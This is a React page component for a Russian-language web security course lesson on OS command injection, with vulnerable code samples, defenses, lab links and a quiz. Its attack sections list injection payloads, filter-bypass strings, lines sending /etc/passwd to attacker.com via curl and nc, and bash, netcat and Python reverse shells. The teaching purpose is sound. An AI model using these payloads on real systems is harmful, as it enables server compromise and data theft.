'use client';

import React from 'react';
import { ContentPageLayout } from '@/components/content/ContentPageLayout';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { ExternalLink, AlertTriangle, Terminal } from 'lucide-react';
import { QuizItem } from '@/components/content/QuizItem';

const P: React.FC<React.HTMLAttributes<HTMLParagraphElement>> = ({ children, ...props }) => (
  <p className="mb-3 leading-relaxed" {...props}>{children}</p>
);

const H2: React.FC<React.HTMLAttributes<HTMLHeadingElement>> = ({ children, ...props }) => (
  <h2 className="text-2xl font-bold mb-4 mt-6" {...props}>{children}</h2>
);

const H3: React.FC<React.HTMLAttributes<HTMLHeadingElement>> = ({ children, ...props }) => (
  <h3 className="text-xl font-semibold mb-3 mt-4" {...props}>{children}</h3>
);

export default function Lesson5Page() {
  const quizQuestions = [
    {
      question: "Что такое Command Injection?",
      answers: [
        "Внедрение SQL-кода в запросы",
        "Внедрение команд операционной системы через уязвимое приложение",
        "Внедрение JavaScript-кода",
        "Внедрение HTML-кода"
      ],
      correctAnswerIndex: 1
    },
    {
      question: "Какой символ часто используется для разделения команд в Unix/Linux?",
      answers: [
        "&",
        ";",
        "|",
        "Все перечисленные"
      ],
      correctAnswerIndex: 3
    },
    {
      question: "Что такое Blind Command Injection?",
      answers: [
        "Атака, где злоумышленник не видит прямого вывода команды",
        "Атака только на Windows системы",
        "Атака через SQL запросы",
        "Атака через XSS"
      ],
      correctAnswerIndex: 0
    },
    {
      question: "Какой метод НЕ является защитой от Command Injection?",
      answers: [
        "Валидация входных данных",
        "Использование функций оболочки вместо system()",
        "Использование eval() для выполнения кода",
        "Принцип наименьших привилегий"
      ],
      correctAnswerIndex: 2
    },
    {
      question: "Какая команда может быть использована для определения времени выполнения в Blind Command Injection?",
      answers: [
        "sleep",
        "ping -c 10 127.0.0.1",
        "timeout",
        "Все перечисленные"
      ],
      correctAnswerIndex: 3
    }
  ];

  return (
    <ContentPageLayout
      title="Урок 5: Command Injection"
      subtitle="Изучение атак OS Command Injection, методов эксплуатации и защиты"
    >
      <div className="space-y-6">
        <Card className="border-destructive/50 bg-destructive/5">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <AlertTriangle className="h-5 w-5 text-destructive" />
              Критическое предупреждение
            </CardTitle>
          </CardHeader>
          <CardContent>
            <P>
              Command Injection — одна из самых опасных уязвимостей, позволяющая злоумышленнику выполнять 
              произвольные команды операционной системы на сервере. Это может привести к полной компрометации 
              системы. Все примеры предназначены только для обучения в контролируемых средах.
            </P>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Terminal className="h-6 w-6" />
              Что такое Command Injection?
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P>
              <strong>Command Injection</strong> (также известная как OS Command Injection или Shell Injection) — 
              это уязвимость безопасности, которая позволяет злоумышленнику выполнять произвольные команды 
              операционной системы на сервере, на котором запущено уязвимое приложение.
            </P>
            <P>
              Эта уязвимость возникает, когда приложение передает небезопасные данные (пользовательский ввод, 
              cookie, HTTP заголовки и т.д.) в системную оболочку (shell).
            </P>
            <P>
              <strong>Успешная Command Injection атака может позволить:</strong>
            </P>
            <ul className="list-disc pl-6 mb-3 space-y-1">
              <li>Чтение и изменение файлов</li>
              <li>Выполнение системных команд</li>
              <li>Установку backdoors</li>
              <li>Компрометацию всего сервера</li>
              <li>Горизонтальное и вертикальное перемещение по сети</li>
              <li>Кражу конфиденциальных данных</li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Типы Command Injection</CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            <div>
              <H2>1. In-band (Direct) Command Injection</H2>
              <P>
                <strong>Inbound Command Injection</strong> — тип атаки, где результаты выполнения команды напрямую 
                отображаются в HTTP-ответе приложения.
              </P>

              <H3>Пример уязвимого кода (PHP)</H3>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`<?php
// Уязвимый код: приложение для проверки доступности хоста
$host = $_GET['host'];
$output = shell_exec("ping -c 4 " . $host);
echo "<pre>$output</pre>";
?>

// Легитимный запрос:
http://example.com/ping.php?host=google.com

// Атака:
http://example.com/ping.php?host=google.com;ls
http://example.com/ping.php?host=google.com;cat /etc/passwd
http://example.com/ping.php?host=google.com;whoami`}
                </pre>
              </div>

              <H3>Операторы разделения команд</H3>
              <P>Различные операционные системы используют разные символы для разделения команд:</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Unix/Linux/Mac:
;    - выполнить команду 1, затем команду 2
&    - выполнить команду 1 в фоне, затем команду 2
&&   - выполнить команду 2 только если команда 1 успешна
|    - передать вывод команды 1 в команду 2 (pipe)
||   - выполнить команду 2 только если команда 1 провалилась
\`cmd\` - выполнить cmd и подставить результат
$(cmd) - выполнить cmd и подставить результат

// Windows:
&    - выполнить обе команды
&&   - выполнить команду 2 если команда 1 успешна
|    - pipe (как в Unix)
||   - выполнить команду 2 если команда 1 провалилась

// Пример атаки:
127.0.0.1; whoami
127.0.0.1 & dir
127.0.0.1 | cat /etc/passwd
127.0.0.1 && ls -la`}
                </pre>
              </div>

              <H3>Обход фильтров</H3>
              <P>Если приложение фильтрует некоторые символы, можно попробовать обход:</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Использование новых строк:
%0a whoami
%0d whoami

// Обход пробелов:
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd

// Обход ключевых слов:
w'h'o'a'm'i
w"h"o"a"m"i
wh\\oami
echo who$@ami | bash

// Кодирование:
%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64  (URL encoding)

// Использование переменных окружения PATH`}
                </pre>
              </div>
            </div>

            <div>
              <H2>2. Blind (Out-of-band) Command Injection</H2>
              <P>
                <strong>Blind Command Injection</strong> происходит, когда приложение уязвимо, но результаты 
                выполнения команды не отображаются в HTTP-ответе.
              </P>

              <H3>Методы обнаружения Blind Command Injection</H3>

              <div className="mt-4">
                <H3>2.1 Time-based Detection</H3>
                <P>Использование команд, которые заставляют сервер задержать ответ:</P>
                <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                  <pre className="text-sm">
{`// Linux/Unix:
; sleep 10
& sleep 10 &
| sleep 10
|| sleep 10 ||

// Windows:
& timeout 10 &
| ping -n 10 127.0.0.1 |

// Если ответ приходит через ~10 секунд, уязвимость подтверждена`}
                  </pre>
                </div>
              </div>

              <div className="mt-4">
                <H3>2.2 Out-of-band (OAST) Techniques</H3>
                <P>Использование внешних сервисов для получения подтверждения выполнения команды:</P>
                <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                  <pre className="text-sm">
{`// DNS lookup (Burp Collaborator, interactsh):
; nslookup attacker.com &
; dig attacker.com &
& nslookup \`whoami\`.attacker.com &

// HTTP request:
; curl http://attacker.com?data=\`whoami\` &
; wget http://attacker.com/\`id\` &

// Пример с передачей данных:
; curl http://attacker.com --data-binary @/etc/passwd &
; cat /etc/passwd | nc attacker.com 4444 &

// Windows:
& nslookup attacker.com &
& certutil -urlcache -split -f http://attacker.com/beacon &`}
                  </pre>
                </div>
              </div>

              <div className="mt-4">
                <H3>2.3 Redirecting Output</H3>
                <P>Сохранение результата в доступный через веб файл:</P>
                <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                  <pre className="text-sm">
{`// Сохранение вывода в веб-директорию:
; whoami > /var/www/html/output.txt &
; ls -la / > /tmp/output.txt &

// Чтение файла:
http://example.com/output.txt

// С уникальным именем файла:
; whoami > /var/www/html/\`date +%s\`.txt &`}
                  </pre>
                </div>
              </div>

              <div className="mt-4">
                <H3>2.4 Reverse Shell</H3>
                <P>Установка обратного соединения с атакующим:</P>
                <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                  <pre className="text-sm">
{`// Bash:
; bash -i >& /dev/tcp/attacker.com/4444 0>&1 &

// Netcat:
; nc attacker.com 4444 -e /bin/bash &
; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f &

// Python:
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &

// Слушатель на стороне атакующего:
nc -lvnp 4444`}
                  </pre>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Примеры уязвимого кода</CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            <div>
              <H3>PHP</H3>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`<?php
// Уязвимые функции:
system($_GET['cmd']);
exec($_GET['cmd']);
shell_exec($_GET['cmd']);
passthru($_GET['cmd']);
popen($_GET['cmd'], 'r');
proc_open($_GET['cmd'], $descriptors, $pipes);
\`\$_GET['cmd']\`;  // backticks

// Пример:
$filename = $_GET['filename'];
system("cat " . $filename);
?>`}
                </pre>
              </div>
            </div>

            <div>
              <H3>Python</H3>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`import os
import subprocess

# Уязвимо:
os.system("ping " + user_input)
os.popen("ls " + directory)
subprocess.call("echo " + data, shell=True)

# Пример:
filename = request.args.get('file')
os.system(f"cat {filename}")`}
                </pre>
              </div>
            </div>

            <div>
              <H3>Node.js</H3>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`const { exec } = require('child_process');

// Уязвимо:
exec('ls ' + req.query.dir, (error, stdout, stderr) => {
    res.send(stdout);
});

// Пример:
const host = req.body.host;
exec(\`ping -c 4 \${host}\`, (error, stdout) => {
    console.log(stdout);
});`}
                </pre>
              </div>
            </div>

            <div>
              <H3>Java</H3>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Уязвимо:
String cmd = "ls " + request.getParameter("dir");
Runtime.getRuntime().exec(cmd);

// Пример:
String filename = request.getParameter("file");
Process process = Runtime.getRuntime().exec("cat " + filename);`}
                </pre>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Методы защиты от Command Injection</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <H3>1. Избегайте выполнения системных команд</H3>
              <P><strong>Лучшая защита — не использовать shell вообще!</strong></P>
              <P>Используйте встроенные функции языка программирования вместо системных команд:</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Вместо:
system("cat " . $filename);

// Используйте:
file_get_contents($filename);

// Вместо:
exec("ls " . $directory);

// Используйте:
scandir($directory);`}
                </pre>
              </div>
            </div>

            <div>
              <H3>2. Валидация входных данных (Whitelist)</H3>
              <P>Используйте строгий whitelist допустимых значений:</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// PHP пример:
$allowed_files = ['file1.txt', 'file2.txt', 'file3.txt'];
$filename = $_GET['file'];

if (!in_array($filename, $allowed_files)) {
    die("Invalid file");
}

// Только буквы и цифры:
if (!preg_match('/^[a-zA-Z0-9]+$/', $input)) {
    die("Invalid input");
}

// Python пример:
import re
if not re.match(r'^[a-zA-Z0-9_-]+$', user_input):
    raise ValueError("Invalid input")`}
                </pre>
              </div>
            </div>

            <div>
              <H3>3. Экранирование специальных символов</H3>
              <P>Если невозможно избежать использования shell:</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// PHP:
$safe_arg = escapeshellarg($user_input);
$safe_cmd = escapeshellcmd($user_input);
system("ls " . escapeshellarg($directory));

// Python:
import shlex
safe_input = shlex.quote(user_input)

// Node.js:
const { execFile } = require('child_process');
execFile('ls', [directory], (error, stdout) => {
    // Безопаснее, так как аргументы передаются отдельно
});`}
                </pre>
              </div>
            </div>

            <div>
              <H3>4. Использование безопасных API</H3>
              <P>Используйте функции, которые не вызывают shell:</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Python - subprocess без shell=True:
import subprocess

# НЕБЕЗОПАСНО:
subprocess.call("ls " + directory, shell=True)

# БЕЗОПАСНО:
subprocess.call(["ls", directory])  # shell=False по умолчанию

// Node.js - execFile вместо exec:
const { execFile } = require('child_process');

# НЕБЕЗОПАСНО:
exec(\`ping \${host}\`);

# БЕЗОПАСНО:
execFile('ping', ['-c', '4', host]);`}
                </pre>
              </div>
            </div>

            <div>
              <H3>5. Принцип наименьших привилегий</H3>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Запускайте веб-приложение под непривилегированным пользователем</li>
                <li>Ограничьте доступ к системным командам через AppArmor/SELinux</li>
                <li>Используйте chroot или контейнеры для изоляции</li>
                <li>Отключите опасные функции (в PHP: disable_functions)</li>
              </ul>
            </div>

            <div>
              <H3>6. Web Application Firewall (WAF)</H3>
              <P>Настройте WAF для блокировки подозрительных паттернов:</P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Блокируйте символы: ; & | \` $ ( )</li>
                <li>Блокируйте ключевые слова: cat, ls, whoami, wget, curl, nc</li>
                <li>Мониторьте аномальные запросы</li>
              </ul>
            </div>

            <div>
              <H3>7. Мониторинг и логирование</H3>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Логируйте все выполняемые системные команды</li>
                <li>Настройте алерты на подозрительную активность</li>
                <li>Используйте SIEM для анализа логов</li>
                <li>Мониторьте исходящие соединения</li>
              </ul>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Практические лаборатории</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P>
              Рекомендуемые платформы для практики Command Injection:
            </P>
            <ul className="list-disc pl-6 space-y-2">
              <li>
                <strong>PortSwigger Web Security Academy - OS Command Injection</strong>
                <a 
                  href="https://portswigger.net/web-security/os-command-injection" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="inline-flex items-center ml-2 text-primary hover:underline"
                >
                  Перейти к лабораториям <ExternalLink className="ml-1 h-4 w-4" />
                </a>
                <div className="ml-4 mt-2 text-sm text-muted-foreground">
                  Рекомендуемые лабораторные работы:
                  <ol className="list-decimal pl-6 mt-2 space-y-1">
                    <li>OS command injection, simple case</li>
                    <li>Blind OS command injection with time delays</li>
                    <li>Blind OS command injection with output redirection</li>
                  </ol>
                </div>
              </li>
              <li><strong>DVWA (Damn Vulnerable Web Application)</strong> - Command Injection модуль</li>
              <li><strong>WebGoat</strong> - Command Injection lessons</li>
              <li><strong>HackTheBox</strong> - Machines с Command Injection</li>
              <li><strong>TryHackMe</strong> - Command Injection комнаты</li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Инструменты для тестирования</CardTitle>
          </CardHeader>
          <CardContent>
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>Burp Suite</strong> - Intruder для автоматизации тестирования</li>
              <li><strong>OWASP ZAP</strong> - Автоматическое сканирование</li>
              <li><strong>Commix</strong> - Специализированный инструмент для Command Injection</li>
              <li><strong>Burp Collaborator / interactsh</strong> - Для Out-of-band тестирования</li>
              <li><strong>netcat / ncat</strong> - Для reverse shells</li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Проверка знаний</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-6">
              {quizQuestions.map((q, index) => (
                <QuizItem
                  key={index}
                  question={q.question}
                  answers={q.answers}
                  correctAnswerIndex={q.correctAnswerIndex}
                />
              ))}
            </div>
          </CardContent>
        </Card>

        <Card className="bg-primary/5 border-primary/20">
          <CardHeader>
            <CardTitle>Заключение</CardTitle>
          </CardHeader>
          <CardContent>
            <P>
              Command Injection — критическая уязвимость, которая может привести к полной компрометации сервера. 
              Лучшая защита — <strong>полностью избегать выполнения системных команд</strong> в веб-приложениях.
            </P>
            <P>
              Если выполнение команд необходимо, используйте строгую валидацию входных данных (whitelist), 
              безопасные API (без вызова shell), и применяйте принцип наименьших привилегий.
            </P>
            <P>
              <strong>Помните:</strong> Никогда не доверяйте пользовательскому вводу и всегда применяйте 
              defense in depth!
            </P>
          </CardContent>
        </Card>
      </div>
    </ContentPageLayout>
  );
}
